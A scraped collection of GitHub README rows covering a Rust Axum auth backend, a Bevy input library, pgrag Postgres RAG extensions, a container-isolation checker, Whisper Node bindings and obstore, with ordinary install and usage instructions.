  - Red packages (high D) are primary candidates for restructuring.
- Monitor these metrics over time to ensure your codebase maintains a good structure as it evolves.
- Use in conjunction with other software quality metrics and practices for a comprehensive view of your codebase's health.

While these metrics provide valuable insights, they should not be treated as absolute rules. Always consider the specific context and requirements of your project when making architectural decisions.

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

",0,0,2,MIT,"maven-publish.yml,maven.yml",9.0
AarambhDevHub/rust-backend-axum,main,"# Rust Backend with Axum, PostgreSQL, & Email Verification

[![Watch the video](https://img.youtube.com/vi/M0wi7V1rP4Y/maxresdefault.jpg)](https://youtu.be/M0wi7V1rP4Y)

This repository contains the source code for a fully functional backend application built with Rust, using the [Axum](https://github.com/tokio-rs/axum) framework. It includes user authentication, email verification, and a connection to a PostgreSQL database.

## üõ†Ô∏è Features

- **User Authentication**: Register, login, password reset functionality.
- **Email Verification**: Users receive an email to verify their accounts.
- **PostgreSQL Integration**: Store and manage user data securely.
- **JWT Authentication**: Secure API endpoints with JSON Web Tokens (JWT).
- **Middleware**: Implement custom middleware for authentication.
- **Testing with Postman**: A full Postman collection is provided to test all API endpoints.

## üöÄ Getting Started

### Prerequisites

To run this project, you will need:

- [Rust](https://www.rust-lang.org/) installed on your machine.
- [PostgreSQL](https://www.postgresql.org/) installed and running locally or remotely.
- [SQLx-CLI](https://crates.io/crates/sqlx-cli) for database migrations.
- [Postman](https://www.postman.com/) for testing API endpoints.

### Installation

1. **Clone the repository:**

    ```bash
    git clone https://github.com/AarambhDevHub/rust-backend-axum.git
    cd rust-backend-axum
    ```

2. **Install dependencies:**

    ```bash
    cargo install --path .
    ```

3. **Set up PostgreSQL:**

   Create a new database in PostgreSQL and update the `.env` file with your database URL.

   Example:

    ```
    DATABASE_URL=postgres://user:password@localhost/dbname
    ```

4. **Run migrations:**

    ```bash
    sqlx migrate run
    ```

5. **Start the server:**

    ```bash
    cargo run
    ```

   The server will be running on `http://127.0.0.1:8000`.

## üì¨ Email Verification Setup

To enable email verification, you will need to configure an email service provider. Update the following environment variables in your `.env` file:

```env
SMTP_SERVER=smtp.your-email-provider.com
SMTP_PORT=587
SMTP_USER=your-email@example.com
SMTP_PASSWORD=your-email-password
```

The application will send verification emails to users after registration.

## üß™ API Testing with Postman

You can test all the API endpoints using the provided Postman collection. [Download the Postman collection here](https://github.com/AarambhDevHub/rust-backend-axum/blob/main/postman_collection.json) and import it into Postman.

API Endpoints:

POST `/api/auth/register`: Register a new user

POST `/api/auth/login`: Login with an existing user

GET `/api/auth/forgot-password`: Request password reset

POST `/api/auth/reset-password`: Reset user password

GET `/api/auth/verify`: Verify email with token

GET `/api/users/me`: Get current user profile (JWT required)

## ‚öôÔ∏è Configuration

The application requires a .env file for configuration. Below are the required environment variables:

```
# -----------------------------------------------------------------------------
# Database (PostgreSQL)
# -----------------------------------------------------------------------------
DATABASE_URL=postgresql://postgres:password@localhost:5432/axum_auth

# -----------------------------------------------------------------------------
# JSON Web Token Credentials
# -----------------------------------------------------------------------------
JWT_SECRET_KEY=my_ultra_secure_jwt_secret_key
JWT_MAXAGE=60

# -----------------------------------------------------------------------------
# SMTP Server Settings
# -----------------------------------------------------------------------------
SMTP_SERVER=smtp.your-email-provider.com
SMTP_PORT=587                     # Common ports: 587 (TLS), 465 (SSL), 25 (non-secure)
SMTP_USERNAME=your_email@example.com
SMTP_PASSWORD=your_email_password
SMTP_FROM_ADDRESS=no-reply@yourdomain.com
```

## üéØ Future Enhancements

Add role-based access control (RBAC) for different user roles (admin, user).
Improve security with additional layers like rate limiting and input validation.
Expand API to include more features like user profiles, etc.

## üìÑ License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.


## ‚ú® Acknowledgements

[Axum](https://github.com/tokio-rs/axum) for building powerful, fast APIs in Rust.

[PostgreSQL](https://www.postgresql.org/) for reliable database management.

[SQLx](https://github.com/launchbadge/sqlx) for async SQL in Rust.

## Donations

If you find this project useful and would like to support its continued development, you can make a donation via [Buy Me a Coffee](https://buymeacoffee.com/aarambhdevhub).

Thank you for your support!
",0,1,1,MIT,,0.0
projectharmonia/bevy_enhanced_input,master,"# Bevy Enhanced Input

[![crates.io](https://img.shields.io/crates/v/bevy_enhanced_input)](https://crates.io/crates/bevy_enhanced_input)
[![docs.rs](https://docs.rs/bevy_enhanced_input/badge.svg)](https://docs.rs/bevy_enhanced_input)
[![codecov](https://codecov.io/gh/projectharmonia/bevy_enhanced_input/graph/badge.svg?token=wirFEuKmMz)](https://codecov.io/gh/projectharmonia/bevy_enhanced_input)

Dynamic and contextual input mappings for Bevy, inspired by [Unreal Engine Enhanced Input](https://dev.epicgames.com/documentation/en-us/unreal-engine/enhanced-input-in-unreal-engine).

## Features

* Map inputs from various sources (keyboard, gamepad, etc.) to gameplay actions like `Jump`, `Move`, or `Attack`.
* Assign actions to different contexts like `OnFoot` or `InCar`, which are regular components.
* Activate or deactivate contexts by simply adding or removing components.
* Control how actions accumulate input from sources and consume it.
* Layer multiple contexts on a single entity, controlled by priority.
* Apply modifiers to inputs, such as dead zones, inversion, scaling, etc., or create custom modifiers by implementing a trait.
* Assign conditions for how and when an action is triggered, like ""hold"", ""tap"", ""chord"", etc. You can also create custom conditions by implementing a trait.
* React on actions with observers.

## Getting Started

Check out the [quick start guide](https://docs.rs/bevy_enhanced_input) for more details.

See also examples in the repo. [simple.rs](examples/simple.rs) should be a good starting point.

Have any questions? Feel free to ask in the dedicated [`bevy_enhanced_input` channel](https://discord.com/channels/691052431525675048/1297361733886677036) in Bevy's Discord server.

## Bevy compatibility

| bevy        | bevy_enhanced_input |
| ----------- | ------------------- |
| 0.14.0      | 0.1-0.2             |
",3,1,2,Apache-2.0,"dependencies.yml,main.yml",6.0
neondatabase-labs/pgrag,main,"# pgrag ‚Äî¬†EXPERIMENTAL

Experimental Postgres extensions to support end-to-end Retrieval-Augmented Generation (RAG) pipelines.

These currently provide:


### Text extraction and conversion

* Simple text extraction from PDF documents (using [pdf-extract](https://github.com/jrmuizel/pdf-extract)). Currently no OCR and no support for complex layout or formatting.

* Simple text extraction from .docx documents (using [docx-rs](https://github.com/cstkingkey/docx-rs)).

* HTML conversion to Markdown (using [htmd](https://github.com/letmutex/htmd)).


### Text chunking

* Text chunking by character count (using [text-splitter](https://github.com/benbrandt/text-splitter)).

* Text chunking by token count (also using [text-splitter](https://github.com/benbrandt/text-splitter)).


### Local embedding and reranking models

These models run locally on the Postgres server's CPU or GPU. They are packaged as separate extensions, because they are large (>100MB) and because we may want to add others in future.

* Local tokenising + embedding generation with 33M parameter model [bge-small-en-v1.5](https://huggingface.co/Xenova/bge-small-en-v1.5) (using [ort](https://github.com/pykeio/ort) via [fastembed](https://github.com/Anush008/fastembed-rs)).

* Local tokenising + reranking with 33M parameter model [jina-reranker-v1-tiny-en](https://huggingface.co/jinaai/jina-reranker-v1-tiny-en) (also using [ort](https://github.com/pykeio/ort) via [fastembed](https://github.com/Anush008/fastembed-rs)).


### Remote embedding and chat models

The extension calls out to these models over HTTPS/JSON APIs.

* OpenAI API for embeddings (e.g. `text-embedding-3-small`) and chat completions (e.g. `gpt-4o-mini`).

* Anthropic API for chat completions (e.g. `claude-3-haiku-20240307`).

* Fireworks.ai API for embeddings (e.g. `nomic-ai/nomic-embed-text-v1.5`) and chat completions (e.g. `llama-v3p1-8b-instruct`).

* Voyage AI API for embeddings (e.g. `voyage-multilingual-2`) and reranking (e.g. `rerank-2-lite`).


## Installation

First, you'll need to install `pgvector`. For example:

```bash
wget https://github.com/pgvector/pgvector/archive/refs/tags/v0.7.4.tar.gz -O pgvector-0.7.4.tar.gz
tar xzf pgvector-0.7.4.tar.gz
cd pgvector-0.7.4
export PG_CONFIG=/path/to/pg_config  # not just a path: should actually end with `pg_config`
make
make install  #¬†may need sudo
```

Next, download the extensions source, and (if you are building the embedding or reranking extensions with baked-in model data) extract the relevant model files:

```bash
cd lib/bge_small_en_v15 && tar xzf model.onnx.tar.gz && cd ../..
cd lib/jina_reranker_v1_tiny_en && tar xzf model.onnx.tar.gz && cd ../..
```

Then (with up-to-date Rust installed):

```bash
cargo install --locked cargo-pgrx@0.12.6
```

Finally, inside each of the three folders inside `exts`:

```bash
PG_CONFIG=/path/to/pg_config cargo pgrx install --release
```

The extension has been tested on Linux and macOS. pgrx does not currently support Windows.


### Embedding and reranking extensions

#### Background worker process

To avoid requiring excessive memory when reranking or generating embeddings in multiple Postgres processes, each of these tasks is done by a multi-threaded background worker (the worker is started when Postgres starts, but the models are lazy-loaded on first use).

For `rag_bge_small_en_v15` and `rag_jina_reranker_v1_tiny_en`, you'll therefore need to edit `postgresql.conf` to add a `shared_preload_libraries` configuration:

```
shared_preload_libraries = 'rag_bge_small_en_v15.so,rag_jina_reranker_v1_tiny_en.so'
```

On macOS, replace `.so` with `.dylib` in these library names.

When using `cargo pgrx run` with Postgres instances installed by pgrx, `postgresql.conf` is located in `~/.pgrx/data-N` (where N is the relevant Postgres version).

When using `cargo pgrx test`, `postgresql.conf` is inside the `target` directory of your extension, e.g. `~/path/to/myext/target/test-pgdata/N` (where N is the relevant Postgres version).

#### ORT and ONNX installation

The `ort` and `ort-sys` crates are currently supplied in patched form in `vendor`, otherwise `ort` and `ort-sys` versions end up mismatched, and that leads to build failures. We stick at `2.0.0-rc.4` (by keeping `fastembed` at `=3.14.1`) because this is the last version using the ONNX Runtime at `1.18`, and `1.19` has build problems on some platforms at the time of writing.

The `ort` package supplies precompiled binaries for the ONNX runtime (currently v1.18). On some platforms, this may give rise to `undefined symbol` errors. In that case, you'll need to compile the ONNX runtime yourself and provide the build location to `cargo pgrx install` in the `ORT_LIB_LOCATION` environment variable. An example for Ubuntu 24.04 is provided in [COMPILE.sh](COMPILE.sh).

#### Remote ONNX model file

By default, the embedding and reranking model data are embedded within the extension, using Rust's `include_bytes!()` macro. Alternatively, it's possible to have the `.onnx` files downloaded on first use (since the last Postgres restart). This is enabled by the `remote_onnx` crate feature, and the download URL is specified via the `REMOTE_ONNX_URL` build-time environment variable. For example:

```bash
REMOTE_ONNX_URL=http://example.com/path/model.onnx cargo pgrx install --release --features remote_onnx
```

The `REMOTE_ONNX_URL` variable defaults to a HuggingFace URL, but it is strongly recommended to change this to a location you control.


## Usage

```sql
create extension if not exists rag cascade;
create extension if not exists rag_bge_small_en_v15 cascade; 
create extension if not exists rag_jina_reranker_v1_tiny_en cascade; 
```

The three extensions have no dependencies on each other, but all are dependent on pgvector. Specify `cascade` to ensure pgvector is installed alongside them.


#### `markdown_from_html(text) -> text`

Locally convert HTML to Markdown:

```sql
select rag.markdown_from_html('<html><body><h1>Title</h1><p>A <i>very</i> short paragraph</p><p>Another paragraph</p></body></html>');
--  '# Title\n\nA _very_ short paragraph\n\nAnother paragraph'
```


#### `text_from_pdf(bytea) -> text`

Locally extract text from a PDF:

```sql
\set contents `base64 < /path/to/your.pdf`
select rag.text_from_pdf(decode(:'contents', 'base64'));
-- 'Text content of PDF'
```


#### `text_from_docx(bytea) -> text`

Locally extract text from a .docx file:

```sql
\set contents `base64 < /path/to/your.docx`
select rag.text_from_docx(decode(:'contents', 'base64'));
-- 'Text content of .docx'
```


#### `chunks_by_character_count(text, max_characters integer, max_overlap_characters integer) -> text[]`

Locally chunk text using character count, with max and overlap:

```sql
select rag.chunks_by_character_count('The quick brown fox jumps over the lazy dog', 20, 4);
-- {""The quick brown fox"",""fox jumps over the"",""the lazy dog""}
```


#### `chunks_by_token_count(text, max_tokens integer, max_overlap_tokens integer) -> text[]`

Locally chunk text using token count for specific embedding model, with max and overlap:

```sql
select rag_bge_small_en_v15.chunks_by_token_count('The quick brown fox jumps over the lazy dog', 4, 1);
-- {""The quick brown fox"",""fox jumps over the"",""the lazy dog""}
```


#### `embedding_for_passage(text) -> vector(384)`
#### `embedding_for_query(text) -> vector(384)`

Locally tokenize + generate embeddings using a small (33M param) model:

```sql
select rag_bge_small_en_v15.embedding_for_passage('The quick brown fox jumps over the lazy dog');
-- [-0.1047543,-0.02242211,-0.0126493685, ...]
select rag_bge_small_en_v15.embedding_for_query('What did the quick brown fox jump over?');
-- [-0.09328926,-0.030567117,-0.027558783, ...]
```

#### `rerank_score(text, text) -> real`
#### `rerank_score(text, text[]) -> real[]`
#### `rerank_distance(text, text) -> real`
#### `rerank_distance(text, text[]) -> real[]`

Locally tokenize + calculate reranking scores for original texts using a small (33M param) model.

In each case `distance` is equal to `-score`. If multiple texts are provided in the second argument, scores or distances are returned in matching order.

```sql
select rag_jina_reranker_v1_tiny_en.rerank_distance('The quick brown fox jumps over the lazy dog', 'What did the quick brown fox jump over?');
-- -1.1093962

select rag_jina_reranker_v1_tiny_en.rerank_distance('The quick brown fox jumps over the lazy dog', 'Never Eat Shredded Wheat');
-- 1.4725753
```


#### `openai_set_api_key(text)`
#### `openai_get_api_key() -> text`

Store and retrieve your OpenAI API key:

```sql
select rag.openai_set_api_key('sk-proj-...');
select rag.openai_get_api_key();
-- 'sk-proj-...'
```

#### `openai_text_embedding(model text, text) -> vector`
#### `openai_text_embedding_3_small(text) -> vector(1536)`
#### `openai_text_embedding_3_large(text) -> vector(3072)`
#### `openai_text_embedding_ada_002(text) -> vector(1536)`

Call out to OpenAI embeddings API (making network request):

```sql
select rag.openai_text_embedding_3_small('The quick brown fox jumps over the lazy dog');
-- [-0.020836005,-0.016921125,-0.00450666, ...]
```


#### `openai_chat_completion(json) -> json`

Call out to OpenAI chat/completions API (making network request):

```sql
select rag.openai_chat_completion('{
  ""model"": ""gpt-4o-mini"",
  ""messages"":[
    {""role"": ""system"", ""content"": ""you are a helpful assistant""},
    {""role"": ""user"", ""content"": ""hi!""}
  ]
}'::json);
-- {""id"": ""chatcmpl-..."", ""model"": ""gpt-4o-mini-2024-07-18"", ""usage"": {""total_tokens"": 27, ""prompt_tokens"": 18, ""completion_tokens"": 9}, ""object"": ""chat.completion"", ""choices"": [{""index"": 0, ""message"": {""role"": ""assistant"", ""content"": ""Hello! How can I assist you today?"", ""refusal"": null}, ""logprobs"": null, ""finish_reason"": ""stop""}], ""created"": 1724765541, ""system_fingerprint"": ""fp_...""}
```


#### `anthropic_set_api_key(text)`
#### `anthropic_get_api_key() -> text`

Store and retrieve your Anthropic API key:

```sql
select rag.anthropic_set_api_key('sk-ant-api...');
select rag.anthropic_get_api_key();
-- 'sk-ant-api...'
```

#### `anthropic_messages(version text, body json) -> json`

Call out to Anthropic messages (i.e. chat/completions) API (making network request):

```sql
select rag.anthropic_messages('2023-06-01', '{
  ""model"": ""claude-3-haiku-20240307"",
  ""max_tokens"": 64,
  ""system"": ""you are a helpful assistant"",
  ""messages"":[
    {
      ""role"": ""user"",
      ""content"": ""hi!""
    }
  ]
}'::json);
--  {""content"":[{""text"":""Hello! How can I assist you today?"",""type"":""text""}],""id"":""msg_..."",""model"":""claude-3-haiku-20240307"",""role"":""assistant"",""stop_reason"":""end_turn"",""stop_sequence"":null,""type"":""message"",""usage"":{""input_tokens"":14,""output_tokens"":19}}
```


#### `fireworks_set_api_key(text)`
#### `fireworks_get_api_key() -> text`

Store and retrieve your Fireworks.ai API key:

```sql
select rag.fireworks_set_api_key('fw_...');
select rag.fireworks_get_api_key();
-- 'fw_...'
```

#### `fireworks_nomic_embed_text_v15(text) -> vector(768)`
#### `fireworks_nomic_embed_text_v1(text) -> vector(768)`
#### `fireworks_text_embedding_whereisai_uae_large_v1(text) -> vector(1024)`
#### `fireworks_text_embedding_thenlper_gte_large(text) -> vector(1024)`
#### `fireworks_text_embedding_thenlper_gte_base(text) -> vector(768)`
#### `fireworks_text_embedding(model text, input text) -> vector`

Call out to Fireworks.ai embeddings API (making network request):

```sql
select rag.fireworks_nomic_embed_text_v15('The quick brown fox jumps over the lazy dog');
-- [-0.012481689,0.026031494,-0.15270996, ...]
```

#### `fireworks_chat_completion(json) -> json`

Call out to Fireworks.ai chat/completions API (makes network request):

```sql
select rag.fireworks_chat_completion('{
  ""model"": ""accounts/fireworks/models/llama-v3p1-8b-instruct"",
  ""messages"":[
    {""role"": ""system"", ""content"": ""you are a helpful assistant""},
    {""role"": ""user"", ""content"": ""hi!""}
  ]
}'::json);
--  {""choices"":[{""finish_reason"":""stop"",""index"":0,""message"":{""content"":""Hi! How can I assist you today?"",""role"":""assistant""}}],""created"":1725362940,""id"":""..."",""model"":""accounts/fireworks/models/llama-v3p1-8b-instruct"",""object"":""chat.completion"",""usage"":{""completion_tokens"":10,""prompt_tokens"":23,""total_tokens"":33}}
```


#### `voyageai_set_api_key(text)`
#### `voyageai_get_api_key() -> text`

Store and retrieve your Voyage AI API key:

```sql
select rag.voyageai_set_api_key('pa-...');
select rag.voyageai_get_api_key();
-- 'pa-...'
```

#### `voyageai_embedding(model text, input_type, text) -> vector`
#### `voyageai_embedding_3(input_type, text) -> vector(1024)`
#### `voyageai_embedding_3_lite(input_type, text) -> vector(512)`
#### `voyageai_embedding_code_2(input_type, text) -> vector(1536)`
#### `voyageai_embedding_finance_2(input_type, text) -> vector(1024)`
#### `voyageai_embedding_law_2(input_type, text) -> vector(1024)`
#### `voyageai_embedding_multilingual_2(input_type, text) -> vector(1024)`

Call out to Voyage AI embeddings API (making network request).

`input_type` may be `'query'` or `'document'` (or `NULL`):

```sql
select rag.voyageai_embedding_3_lite('document', 'the cat sat on the mat');
-- [-0.033761546,0.01360899,0.0832813, ...]
```

#### `voyageai_rerank_score(model text, query text, document text) -> real`
#### `voyageai_rerank_score(model text, query text, documents text[]) -> real[]`
#### `voyageai_rerank_distance(model text, query text, document text) -> real`
#### `voyageai_rerank_distance(model text, query text, documents text[]) -> real[]`

Call out to Voyage AI reranking model (making network request). 

In each case `distance` is equal to `-score`. If multiple texts are provided in the second argument, scores or distances are returned in matching order.

```sql
select rag.voyageai_rerank_distance('rerank-2-lite', 'the cat sat on the mat', ARRAY['the baboon played with the balloon', 'how much wood would a woodchuck chuck?']);
-- {-0.5,-0.4609375}
```


## End-to-end RAG example

Setup: create a `docs` table and ingest some PDF documents as text.

```sql
drop table docs cascade;
create table docs
( id int primary key generated always as identity
, name text not null
, fulltext text not null
);

\set contents `base64 < /path/to/first.pdf`
insert into docs (name, fulltext)
values ('first.pdf', rag.text_from_pdf(decode(:'contents','base64')));

\set contents `base64 < /path/to/second.pdf`
insert into docs (name, fulltext)
values ('second.pdf', rag.text_from_pdf(decode(:'contents','base64')));

\set contents `base64 < /path/to/third.pdf`
insert into docs (name, fulltext)
values ('third.pdf', rag.text_from_pdf(decode(:'contents','base64'))));
```

Now we create an `embeddings` table, chunk the text, and generate embeddings for the chunks (this is all done locally).

```sql
drop table embeddings;
create table embeddings
( id int primary key generated always as identity
, doc_id int not null references docs(id)
, chunk text not null
, embedding vector(384) not null
);

create index on embeddings using hnsw (embedding vector_cosine_ops);

with chunks as (
  select id, unnest(rag_bge_small_en_v15.chunks_by_token_count(fulltext, 192, 8)) as chunk
  from docs
)
insert into embeddings (doc_id, chunk, embedding) (
  select id, chunk, rag_bge_small_en_v15.embedding_for_passage(chunk) from chunks
);
```

Let's query the embeddings and rerank the results (still all done locally).

```sql
\set query 'what is [...]? how does it work?'

with ranked as (
  select
    id, doc_id, chunk, embedding <=> rag_bge_small_en_v15.embedding_for_query(:'query') as cosine_distance
  from embeddings
  order by cosine_distance
  limit 10
)
select *, rag_jina_reranker_v1_tiny_en.rerank_distance(:'query', chunk)
from ranked
order by rerank_distance;
```

Building on that, now we can also feed the query and top chunks to remote ChatGPT to complete the RAG pipeline.

```sql
\set query 'what is [...]? how does it work?'

with ranked as (
  select
    id, doc_id, chunk, embedding <=> rag_bge_small_en_v15.embedding_for_query(:'query') as cosine_distance
  from embeddings
  order by cosine_distance limit 10
),
reranked as (
  select *, rag_jina_reranker_v1_tiny_en.rerank_distance(:'query', chunk)
  from ranked
  order by rerank_distance limit 5
)
select rag.openai_chat_completion(json_object(
  'model': 'gpt-4o-mini',
  'messages': json_array(
    json_object(
      'role': 'system',
      'content': E'The user is [...].\n\nTry to answer the user''s QUESTION using only the provided CONTEXT.\n\nThe CONTEXT represents extracts from [...] which have been selected as most relevant to this question.\n\nIf the context is not relevant or complete enough to confidently answer the question, your best response is: ""I''m afraid I don''t have the information to answer that question"".'
    ),
    json_object(
      'role': 'user',
      'content': E'# CONTEXT\n\n```\n' || string_agg(chunk, E'\n\n') || E'\n```\n\n# QUESTION\n\n```\n' || :'query' || E'```'
    )
  )
)) -> 'choices' -> 0 -> 'message' -> 'content' as answer
from reranked;
```


## License

This software is released under the [Apache 2.0 license](LICENSE). Third-party code and data are provided under their respective licenses.
",1,0,3,NOASSERTION,,0.0
edera-dev/am-i-isolated,main,"# *Am I Isolated*

*Am I Isolated* is a security posture benchmarking tool.

It evaluates a given runtime environment and attempts to look for things
which may be a security problem, as well as providing suggestions for
solving the security problem.

Security is a rapidly evolving space: it is intended that *Am I Isolated* is
updated over time to incorporate new and relevant security research
relating to jailing containers.

*Am I Isolated* is also still a work in progress and does not yet incorporate
tests for all possible container security problems.  Current work is
focused on providing enough data in a digestable format, rather than
overwhelming security engineers and CISOs with too much data.

## Using *Am I Isolated*

In general you will want to use the OCI image:

```sh
docker run --rm -it ghcr.io/edera-dev/am-i-isolated:nightly
```

To detect isolation gaps in your Kubernetes environments, you can run it as a Pod

```sh
apiVersion: v1
kind: Pod
metadata:
  name: am-i-isolated
spec:
  containers:
  - name: am-i-isolated
    image: ""ghcr.io/edera-dev/am-i-isolated:nightly""
```

And fetch the logs for the results

```sh
kubectl logs am-i-isolated
```

You can also build and run directly with Cargo.
",5,4,9,Apache-2.0,"nightly.yml,release.yml",12.0
Brooooooklyn/whisper-node,main,"# `@napi-rs/whisper`

![https://github.com/Brooooooklyn/whisper-node/actions](https://github.com/Brooooooklyn/whisper-node/workflows/CI/badge.svg)

## Usage

> [!IMPORTANT]
> This package is working in progress, and only support macOS now.
> Download the whisper model before use it.

### Download Whisper Model

```bash
./scripts/download-ggml-model.sh large-v3-turbo
```

### Speech to Text

```js
import { readFile } from 'node:fs/promises'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'

import { Whisper, WhisperFullParams, WhisperSamplingStrategy, decodeAudioAsync } from './index.js'

const rootDir = join(fileURLToPath(import.meta.url), '..')

const GGLM_LARGE = await readFile(join(rootDir, 'ggml-large-v3-turbo.bin'))

const audio = await readFile(join(rootDir, '__test__/rolldown.wav'))

const whisper = new Whisper(GGLM_LARGE)

const audioBuffer = await decodeAudioAsync(audio, 'rolldown.wav')

const whisperParams = new WhisperFullParams(WhisperSamplingStrategy.Greedy)
whisperParams.language = 'en'
whisperParams.printProgress = true
whisperParams.singleSegment = false
whisperParams.durationMs = 0
whisperParams.printRealtime = true
whisperParams.onEncoderBegin = (state) => {
  console.info(Whisper.lang(state.fullLangId))
}
whisperParams.onProgress = (progress) => {
  console.info(`Progress: ${progress}`)
}
whisperParams.onNewSegment = (segment) => {
  console.info(segment)
}

const output = whisper.full(whisperParams, audioBuffer)

console.info(output)
// Rolldown is a JavaScript/TypeScript bundler written in Rust intended to serve as the future bundler used in Vite.
```

### decode audio

> [!TIP]
> This package provide a convenient function to decode various audio format to PCM buffer.

There are many audio formats supports, full list can be found in [Symphonia homepage](https://github.com/pdeljanov/Symphonia?tab=readme-ov-file#status)

```js
import { readFile } from 'node:fs/promises'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'

import { decodeAudioAsync } from './index.js'

const rootDir = join(fileURLToPath(import.meta.url), '..')

const audio = await readFile(join(rootDir, '__test__/rolldown.wav'))

// there is also a sync version: `decodeAudio`
const audioBuffer = await decodeAudioAsync(audio, 'rolldown.wav')
```
",0,2,1,MIT,CI.yml,5.0
developmentseed/obstore,main,"# obstore

[![PyPI][pypi_badge]][pypi_link]
[![Conda Version][conda_version_badge]][conda_version]

[pypi_badge]: https://badge.fury.io/py/obstore.svg
[pypi_link]: https://pypi.org/project/obstore/
[conda_version_badge]: https://img.shields.io/conda/vn/conda-forge/obstore.svg
[conda_version]: https://prefix.dev/channels/conda-forge/packages/obstore

Simple, fast integration with object storage services like Amazon S3, Google Cloud Storage, Azure Blob Storage, and S3-compliant APIs like Cloudflare R2.

- Sync and async API.
- Streaming downloads with configurable chunking.
- Streaming `list`, with no need to paginate.
- File-like object API and [fsspec](https://github.com/fsspec/filesystem_spec) integration.
- Support for conditional put (""put if not exists""), as well as custom tags and attributes.
- Automatically uses [multipart uploads](https://docs.aws.amazon.com/AmazonS3/latest/userguide/mpuoverview.html) under the hood for large file objects.
- Optionally return list results as [Arrow](https://arrow.apache.org/), which is faster than materializing Python `dict`/`list` objects.
- Easy to install with no required Python dependencies.
- The [underlying Rust library](https://docs.rs/object_store) is production quality and used in large scale production systems, such as the Rust package registry [crates.io](https://crates.io/).
- Support for zero-copy data exchange from Rust into Python in `get_range` and `get_ranges`.
- Simple API with static type checking.
- Helpers for constructing from environment variables and `boto3.Session` objects

<!-- For Rust developers looking to add object_store support to their Python packages, refer to pyo3-object_store. -->

## Installation

To install obstore using pip:

```sh
pip install obstore
```

Obstore is on [conda-forge](https://prefix.dev/channels/conda-forge/packages/obstore) and can be installed using [conda](https://docs.conda.io), [mamba](https://mamba.readthedocs.io/), or [pixi](https://pixi.sh/). To install obstore using conda:

```
conda install -c conda-forge obstore
```

## Documentation

[Full documentation is available on the website](https://developmentseed.org/obstore).

## Usage

### Constructing a store

Classes to construct a store are exported from the `obstore.store` submodule:

- [`S3Store`](https://developmentseed.org/obstore/latest/api/store/aws/): Configure a connection to Amazon S3.
- [`GCSStore`](https://developmentseed.org/obstore/latest/api/store/gcs/): Configure a connection to Google Cloud Storage.
- [`AzureStore`](https://developmentseed.org/obstore/latest/api/store/azure/): Configure a connection to Microsoft Azure Blob Storage.
- [`HTTPStore`](https://developmentseed.org/obstore/latest/api/store/http/): Configure a connection to a generic HTTP server
- [`LocalStore`](https://developmentseed.org/obstore/latest/api/store/local/): Local filesystem storage providing the same object store interface.
- [`MemoryStore`](https://developmentseed.org/obstore/latest/api/store/memory/): A fully in-memory implementation of ObjectStore.

#### Example

```py
import boto3
from obstore.store import S3Store

session = boto3.Session()
store = S3Store.from_session(session, ""bucket-name"", config={""AWS_REGION"": ""us-east-1""})
```

#### Configuration

Each store class above has its own configuration, accessible through the `config` named parameter. This is covered in the docs, and string literals are in the type hints.

Additional [HTTP client configuration](https://developmentseed.org/obstore/latest/api/store/config/) is available via the `client_options` named parameter.

### Interacting with a store

All methods for interacting with a store are exported as **top-level functions** (not methods on the `store` object):

- [`copy`](https://developmentseed.org/obstore/latest/api/copy/): Copy an object from one path to another in the same object store.
- [`delete`](https://developmentseed.org/obstore/latest/api/delete/): Delete the object at the specified location.
- [`get`](https://developmentseed.org/obstore/latest/api/get/): Return the bytes that are stored at the specified location.
- [`head`](https://developmentseed.org/obstore/latest/api/head/): Return the metadata for the specified location
- [`list`](https://developmentseed.org/obstore/latest/api/list/): List all the objects with the given prefix.
- [`put`](https://developmentseed.org/obstore/latest/api/put/): Save the provided bytes to the specified location
- [`rename`](https://developmentseed.org/obstore/latest/api/rename/): Move an object from one path to another in the same object store.

There are a few additional APIs useful for specific use cases:

- [`get_range`](https://developmentseed.org/obstore/latest/api/get/#obstore.get_range): Get a specific byte range from a file.
- [`get_ranges`](https://developmentseed.org/obstore/latest/api/get/#obstore.get_ranges): Get multiple byte ranges from a single file.
- [`list_with_delimiter`](https://developmentseed.org/obstore/latest/api/list/#obstore.list_with_delimiter): List objects within a specific directory.
- [`sign`](https://developmentseed.org/obstore/latest/api/sign/): Create a signed URL.

File-like object support is also provided:

- [`open`](https://developmentseed.org/obstore/latest/api/file/#obstore.open): Open a remote object as a Python file-like object.
- [`AsyncFsspecStore`](https://developmentseed.org/obstore/latest/api/fsspec/#obstore.fsspec.AsyncFsspecStore) adapter for use with [`fsspec`](https://github.com/fsspec/filesystem_spec).

All methods have a comparable async method with the same name plus an `_async` suffix.

#### Example

```py
import obstore as obs

store = obs.store.MemoryStore()

obs.put(store, ""file.txt"", b""hello world!"")
response = obs.get(store, ""file.txt"")
response.meta
# {'path': 'file.txt',
#  'last_modified': datetime.datetime(2024, 10, 21, 16, 19, 45, 102620, tzinfo=datetime.timezone.utc),
#  'size': 12,
#  'e_tag': '0',
#  'version': None}
assert response.bytes() == b""hello world!""

byte_range = obs.get_range(store, ""file.txt"", offset=0, length=5)
assert byte_range == b""hello""

obs.copy(store, ""file.txt"", ""other.txt"")
assert obs.get(store, ""other.txt"").bytes() == b""hello world!""
```

All of these methods also have `async` counterparts, suffixed with `_async`.

```py
import obstore as obs

store = obs.store.MemoryStore()

await obs.put_async(store, ""file.txt"", b""hello world!"")
response = await obs.get_async(store, ""file.txt"")
response.meta
# {'path': 'file.txt',
#  'last_modified': datetime.datetime(2024, 10, 21, 16, 20, 36, 477418, tzinfo=datetime.timezone.utc),
#  'size': 12,
#  'e_tag': '0',
#  'version': None}
assert await response.bytes_async() == b""hello world!""

byte_range = await obs.get_range_async(store, ""file.txt"", offset=0, length=5)
assert byte_range == b""hello""

await obs.copy_async(store, ""file.txt"", ""other.txt"")
resp = await obs.get_async(store, ""other.txt"")
assert await resp.bytes_async() == b""hello world!""
```

## Comparison to object-store-python

[Read a detailed comparison](https://github.com/roeap/object-store-python/issues/24#issuecomment-2422689636) to [`object-store-python`](https://github.com/roeap/object-store-python), a previous Python library that also wraps the same Rust `object_store` crate.
",2,15,13,MIT,"ci.yml,docs.yml,test-python.yml,wheels.yml",69.0
operaton/operaton,main,"# Operaton - The open source process engine

![build status](https://github.com/operaton/operaton/actions/workflows/build.yml/badge.svg?branch=main)
